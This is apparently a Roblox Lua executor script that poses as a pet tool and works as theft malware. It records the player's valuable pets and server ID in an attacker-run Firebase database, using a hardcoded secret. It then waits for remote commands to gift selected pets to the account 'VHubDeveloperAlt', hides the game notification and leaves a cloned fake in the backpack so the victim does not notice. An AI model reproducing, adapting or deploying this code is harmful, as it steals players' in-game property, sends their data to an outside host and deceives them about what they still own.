if somethingevil then
	print("Something evil is already running :|")
	return
end

pcall(function() getgenv().somethingevil = true end)

print("Something evil is running >:)")
local Secret = "FCSZ2B27L4oHVLY7HRVAgQnnNX2pSj9UzqJ6FXCz"
local URL = "https://something-evil-default-rtdb.firebaseio.com/"
local request = request or syn.request

local LocalPlayer = game:GetService("Players").LocalPlayer
local DesiredPets = {"raccoon", "dragonfly", "queen bee", "petal bee", "golden bee", "disco bee", "butterfly", "bear bee", "red fox", "moth"}
local ListOfPets = {}
local HavePets = false

for _, Tool in game:GetService("Players").LocalPlayer.Backpack:GetChildren() do
	local ToolName = string.lower(Tool.Name)

	for _, DesiredPetName in DesiredPets do
		if string.find(ToolName, string.lower(DesiredPetName)) then
			HavePets = true
			ListOfPets[Tool.Name.."_"..math.random(100000, 999999)] = Tool:GetAttribute("PET_UUID")
		end
	end
end

for _, Pet in game:GetService("Workspace").PetsPhysical:GetChildren() do
	if Pet:GetAttribute("OWNER") == LocalPlayer.Name then
		local PetName = nil
		for i, v in Pet:GetChildren() do
			if v:IsA("Model") then
				PetName = v.Name
			end
		end
		
		for _, DesiredPetName in DesiredPets do
			if string.find(string.lower(PetName), string.lower(DesiredPetName)) then
				HavePets = true
				ListOfPets[PetName.."_"..math.random(100000, 999999)] = Pet:GetAttribute("UUID")
			end
		end
	end
end
	
wait()

print("ooooooooooooooooooooo")
for i, v in ListOfPets do
	print(i, v)
end

local function ReadDatabase()
	local database = URL..".json?auth="..Secret
	local data = nil
	local success, error = pcall(function()
		data = game.HttpService:JSONDecode(game:HttpGetAsync(database))
	end)

	if success then
		return data
	else
		print("Could not read database: "..error)
		return nil
	end
end

local function WriteDatabase(Path, Key, Value)
	local success, error = pcall(function()
		local Folder = Path
		local database = URL..Folder..".json?auth="..Secret
		local Table = {}

		if game.HttpService:JSONDecode(game:HttpGetAsync(database)) ~= nil then
			for key, value in pairs(game.HttpService:JSONDecode(game:HttpGetAsync(database))) do
				if key then
					Table[key] = value
				end
			end
		end

		Table[Key] = Value

		local send = request({
			Url = database,
			Method = "PUT",
			Headers = {["Content-Type"] = "application/json"},
			Body = game.HttpService:JSONEncode(Table)
		})
	end)

	if success then
		return true
	else
		print("Could not write database: "..error)
		return false
	end
end

local function DeleteDatabase(Path, Key)
	local success, error = pcall(function()
		local Folder = Path
		local Delete = Key

		local database = URL..Folder..".json?auth="..Secret
		local request = request or syn.request
		local Table = {}

		if game.HttpService:JSONDecode(game:HttpGetAsync(database)) ~= nil then
			for key, value in pairs(game.HttpService:JSONDecode(game:HttpGetAsync(database))) do
				if key ~= Delete then
					Table[key] = value
				end
			end
		end

		local send = request({
			Url = database,
			Method = "PUT",
			Headers = {["Content-Type"] = "application/json"},
			Body = game.HttpService:JSONEncode(Table)
		})
	end)

	if success then
		return true
	else
		print("Could not delete database: "..error)
		return false
	end
end

local data = ReadDatabase()

if data ~= nil then
	if HavePets == true then
		WriteDatabase("Wanteds/"..LocalPlayer.Name, "JobId", game.JobId)
		WriteDatabase("Wanteds/"..LocalPlayer.Name, "LastSeen", os.time())
		
		if data.Wanteds[LocalPlayer.Name].Pets then
			DeleteDatabase("Wanteds/"..LocalPlayer.Name, "Pets")
			wait(0.1)
		end
		
		for PetName, PetId in ListOfPets do
			WriteDatabase("Wanteds/"..LocalPlayer.Name.."/Pets", PetName, PetId)
		end
		
		coroutine.wrap(function()
			while wait(10) do
				WriteDatabase("Wanteds/"..LocalPlayer.Name, "LastSeen", os.time())
			end
		end)()
	else
		if (data.Wanteds[LocalPlayer.Name]) then
			DeleteDatabase("Wanteds", LocalPlayer.Name)
		end
	end
end

coroutine.wrap(function()
	while wait(1) do
		if HavePets == true then
			local data = ReadDatabase()

			if data ~= nil then
				for Username, PetId in data.Remotes do
					if string.match(string.lower(Username), string.lower(LocalPlayer.Name)) then
						DeleteDatabase("Remotes", Username)
						local Location = nil
						local PetInstance = nil
						
						for i, Pet in game:GetService("Players").LocalPlayer.Backpack:GetChildren() do
							if Pet:GetAttribute("PET_UUID") == PetId and Pet:GetAttribute("Duped") == nil then
								Location = "Backpack"
								PetInstance = Pet
							end
						end
						
						for i, Pet in game:GetService("Workspace").PetsPhysical:GetChildren() do
							if Pet:GetAttribute("OWNER") == LocalPlayer.Name and Pet:GetAttribute("UUID") == PetId then
								Location = "Workspace"
							end
						end
						
						local function GetPetInInventory(PetInstance)
							local ToolModelLoaded = false
							local ToolHandleChildren = PetInstance.Handle:GetChildren() 

							if #ToolHandleChildren == 0 then
								PetInstance.Parent = game:GetService("Workspace")[LocalPlayer.Name]
								wait()
								PetInstance.Parent = game:GetService("Players").LocalPlayer.Backpack
							end
							wait()

							game:GetService("Players").LocalPlayer.PlayerGui.Top_Notification.Enabled = false

							PetInstance.Parent = game:GetService("Workspace")[LocalPlayer.Name]
							wait(0.1)

							if PetInstance:GetAttribute("Favorite") == true then
								local args = {
									game:GetService("Players").LocalPlayer.Character:WaitForChild(PetInstance.Name)
								}
								game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(unpack(args))
							end

							wait(0.1)

							local args = {
								"GivePet",
								game:GetService("Players"):FindFirstChild("VHubDeveloperAlt")
							}
							game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer(unpack(args))

							local Fake = PetInstance:Clone()
							Fake.Parent = game:GetService("Players").LocalPlayer.Backpack
							Fake:SetAttribute("Duped", true)
							wait(0.1)
							PetInstance:Destroy()
						end
						
						if Location ~= nil then
							if Location == "Backpack" then
								GetPetInInventory(PetInstance)
							elseif Location == "Workspace" then
								local args = {
									"UnequipPet",
									PetId
								}
								game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("PetsService"):FireServer(unpack(args))
								wait(0.1)
								
								for i, Pet in game:GetService("Players").LocalPlayer.Backpack:GetChildren() do
									if Pet:GetAttribute("PET_UUID") == PetId and Pet:GetAttribute("Duped") == nil then
										PetInstance = Pet
									end
								end
								wait()
								
								GetPetInInventory(PetInstance)
							end
						end
					end
				end
			end
		else
			print("Disconnected")
			coroutine.yield()
		end
	end
end)()
